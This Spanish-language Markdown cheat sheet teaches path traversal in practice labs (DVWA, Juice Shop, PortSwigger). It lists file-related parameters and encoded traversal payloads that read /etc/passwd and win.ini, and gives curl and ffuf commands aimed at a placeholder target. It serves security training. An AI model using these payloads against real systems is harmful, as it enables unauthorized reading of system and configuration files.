<div align="center">

# 📁 Path Traversal
### Lectura Arbitraria de Archivos

</div>

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | File Inclusion |
| **Juice Shop** | Local File Read |
| **PortSwigger** | Path traversal |

---

## 🛠️ Herramientas

- **Caido**: `Replay`, `Automate`
- `ffuf`
- `curl`

---

## 🔍 Parámetros Sospechosos

- `file=`
- `page=`
- `path=`
- `template=`
- `download=`
- `img=`
- `folder=`

---

## 🧪 Payloads Base

```text
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..\..\..\..\windows\win.ini
```

---

## 🔁 Flujo con Caido

1. Capturar request con nombre de archivo.
2. Mandar a `Replay`.
3. Probar archivo esperado.
4. Sustituir por traversal payload.
5. Revisar respuesta:
   - contenido de `/etc/passwd`
   - `win.ini`
   - errores de path

### Automate

Wordlist chica:

```text
../../../../etc/passwd
../../../../etc/hosts
..\..\..\..\windows\win.ini
```

---

## ⚙️ Comandos Útiles

```bash
curl -i "http://target/image?filename=../../../../etc/passwd"

ffuf -u "http://target/load?file=FUZZ" -w traversal.txt
```

---

## 🧠 Objetivos Comunes en Labs

| Linux | Windows |
|-------|---------|
| `/etc/passwd` | `C:\Windows\win.ini` |
| `/etc/hosts` | `C:\Windows\System32\drivers\etc\hosts` |
| app configs | `web.config` |

---

## 🧭 Ruta de Práctica

1. DVWA File Inclusion
2. PortSwigger: simple path traversal
3. PortSwigger: stripped traversal sequences
4. PortSwigger: superfluous URL decode
5. Juice Shop: local file read

---

## 📝 Checklist

- parámetro de archivo controlado
- path absoluto/relativo inferido
- bypass encoding probado
- archivo sensible leído en lab
